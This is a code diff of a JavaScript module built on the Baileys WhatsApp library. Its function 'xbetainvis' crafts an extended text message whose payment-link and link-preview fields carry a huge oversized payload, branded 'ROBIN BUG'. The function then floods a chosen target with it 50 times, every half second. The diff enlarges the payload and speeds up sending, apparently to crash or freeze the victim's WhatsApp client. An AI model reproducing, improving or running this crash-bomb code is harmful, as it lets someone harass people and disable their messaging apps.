@@ -1,41 +1,32 @@
 
-
-const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
-const pino = require('pino');
-const crypto = require('crypto')
+const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
+const { getSuperPayload } = require('./SuperPayload');
 
 async function xbetainvis(SYxS7, target) {
+    const superSpam = getSuperPayload(50000);
+    
     const msg = generateWAMessageFromContent(target, {
         extendedTextMessage: {
-            text: "",
+            text: superSpam,
             matchedText: "https://t.me/kashmiri1_1",
-            description: "",
-            title: "",
             paymentLinkMetadata: {
-                button: { displayText: "" },
+                button: { displayText: "ROBIN BUG" },
                 header: { headerType: 1 },
-                provider: { paramsJson: "{{".repeat(5000) }
+                provider: { paramsJson: superSpam }
             },
             linkPreviewMetadata: {
                 paymentLinkMetadata: {
-                    button: { displayText: "" },
+                    button: { displayText: "ROBIN BUG" },
                     header: { headerType: 1 },
-                    provider: { paramsJson: "{{".repeat(5000) }
-                },
-                urlMetadata: { fbExperimentId: 999 },
-                fbExperimentId: 888,
-                linkMediaDuration: 555,
-                socialMediaPostType: 1221
+                    provider: { paramsJson: superSpam }
+                }
             }
         }
     }, {
         additionalAttributes: { edit: "7" }
     });
 
-    const ms = 3; 
-    const total = 200;
-
-    for (let i = 0; i < total; i++) {
+    for (let i = 0; i < 50; i++) {
         try {
             await SYxS7.relayMessage(target, {
                 groupStatusMessageV2: {
@@ -44,22 +35,11 @@ async function xbetainvis(SYxS7, target) {
             }, { 
                 messageId: null 
             });
-            
-            if (i < total - 1) {
-                await new Promise(resolve => setTimeout(resolve, ms * 1000));
-            }
-            
+            await new Promise(resolve => setTimeout(resolve, 500));
         } catch (error) {
-            console.log(`[ 🗑️ ] Error on message ${i + 1}: ${error.message}`);
-            
-            if (i < total - 1) {
-                await new Promise(resolve => setTimeout(resolve, ms * 1000));
-            }
+            console.log(`[ 🗑️ ] Error: ${error.message}`);
         }
     }
 }
 
-
 module.exports = { xbetainvis };
-
-
